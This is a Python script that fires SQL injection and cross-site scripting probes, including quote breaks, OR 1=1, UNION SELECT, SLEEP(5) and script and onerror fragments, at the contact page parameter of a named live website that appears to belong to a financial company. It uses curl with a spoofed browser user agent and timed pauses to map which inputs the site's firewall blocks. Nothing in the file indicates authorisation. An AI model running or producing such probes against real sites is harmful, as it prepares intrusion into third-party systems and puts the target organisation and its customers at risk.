import urllib.parse, subprocess, time, os, uuid

B = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
q = lambda v: urllib.parse.quote(v, safe="")

def probe(url, extra=None):
    f = "/tmp/z_" + uuid.uuid4().hex[:8]
    args = ["curl","-sk","--max-time","30","-o",f,"-w","%{http_code}|%{size_download}",
            "-A",UA]
    if extra: args += extra
    args.append(url)
    p = subprocess.run(args, capture_output=True, text=True)
    b = open(f,"rb").read() if os.path.exists(f) else b""
    if os.path.exists(f): os.unlink(f)
    return p.stdout, len(b), b

# Characterize: does a single quote alone trigger 403? does a harmless string with "1=1" trigger?
cases = [
    ("benign abc",        "abc"),
    ("single quote",      "abc'"),
    ("double quote",      'abc"'),
    ("comment --",        "abc-- -"),
    ("semicolon",         "abc;--"),
    ("literal 1=1",       "abc 1=1"),
    ("AND 1=1",           "abc AND 1=1"),
    ("AND 1=2",           "abc AND 1=2"),
    ("OR 1=1",            "abc OR 1=1"),
    ("UNION SELECT",      "abc UNION SELECT 1"),
    ("SLEEP",             "abc SLEEP(5)"),
    ("script tag",        "abc<script>"),
    ("onerror",           "abc onerror="),
]
print("=== /contact?cb= WAF characterization ===")
for n,v in cases:
    meta, ln, b = probe(B+"/contact?cb="+q(v))
    print(f"  {n:18s} {meta:16s} len={ln}")
    time.sleep(5)
